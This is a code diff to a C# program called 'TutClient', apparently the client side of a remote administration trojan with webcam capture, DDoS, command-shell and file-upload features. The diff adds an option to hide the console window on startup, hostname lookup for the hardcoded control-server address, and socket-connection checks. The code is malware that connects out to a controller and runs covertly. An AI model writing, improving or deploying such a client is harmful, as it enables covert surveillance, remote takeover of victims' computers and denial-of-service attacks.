@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
@@ -114,13 +112,67 @@ namespace TutClient
         private static VideoCaptureDevice source;
         private static ddos DDoS;
         private static Process cmdProcess;
+        private static bool applicationHidden = false;
 
         static void Main(string[] args)
         {
+            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE);
             _handler += new EventHandler(Handler);
             SetConsoleCtrlHandler(_handler, true);
             ConnectToServer();
             RequestLoop();
+        }
+
+        private static string GetIPAddress(string input)
+        {
+            if (input == "") return null;
+            bool validIP = true;
+
+            if (input.Contains("."))
+            {
+                String[] parts = input.Split('.');
+                if (parts.Length == 4)
+                {
+                    foreach (String ipPart in parts)
+                    {
+                        for (int i = 0; i < ipPart.Length; i++)
+                        {
+                            if (!char.IsNumber(ipPart[i]))
+                            {
+                                validIP = false;
+                                break;
+                            }
+                        }
+
+                        if (!validIP)
+                        {
+                            Console.WriteLine("Invalid IP Address!\r\nInput is not an IP Address");
+                            break;
+                        }
+                    }
+
+                    if (validIP)
+                    {
+                        return input;
+                    }
+                    else
+                    {
+                        //Pretend that the input is a hostname
+                        try
+                        {
+                            string ipAddr = Dns.GetHostAddresses(input)[0].ToString();
+                            return ipAddr;
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
+                            return null;
+                        }
+                    }
+                }
+            }
+
+            return null;
         }
 
         private static void ConnectToServer()
@@ -133,7 +185,8 @@ namespace TutClient
                 {
                     attempts++;
                     Console.WriteLine("Connection attempt " + attempts);
-                    _clientSocket.Connect(IPAddress.Parse("192.168.10.56"), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
+                    string connectionString = GetIPAddress("192.168.10.57"); //Replace IP with DNS if you want
+                    _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
                     Thread.Sleep(100);
                 }
                 catch (SocketException)
@@ -760,7 +813,7 @@ namespace TutClient
                 if (text.StartsWith("fup"))
                 {
                     String location = text.Split('§')[1];
-                    if (!File.Exists(location))
+                    if (File.Exists(location)) //prev. !File.Exists(location) -> bug
                     {
                         reportError(errorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
                         return;
@@ -1447,6 +1500,11 @@ namespace TutClient
 
         private static void sendCommand(String response, bool isCmd = false)
         {
+            if (!_clientSocket.Connected)
+            {
+                Console.WriteLine("Socket is not connected!");
+                return;
+            }
             String k = response;
 
             String crypted = Encrypt(k);
@@ -1457,6 +1515,11 @@ namespace TutClient
 
         private static void sendByte(byte[] data)
         {
+            if (!_clientSocket.Connected)
+            {
+                Console.WriteLine("Socket is not connected!");
+                return;
+            }
             _clientSocket.Send(data);
         }
     }
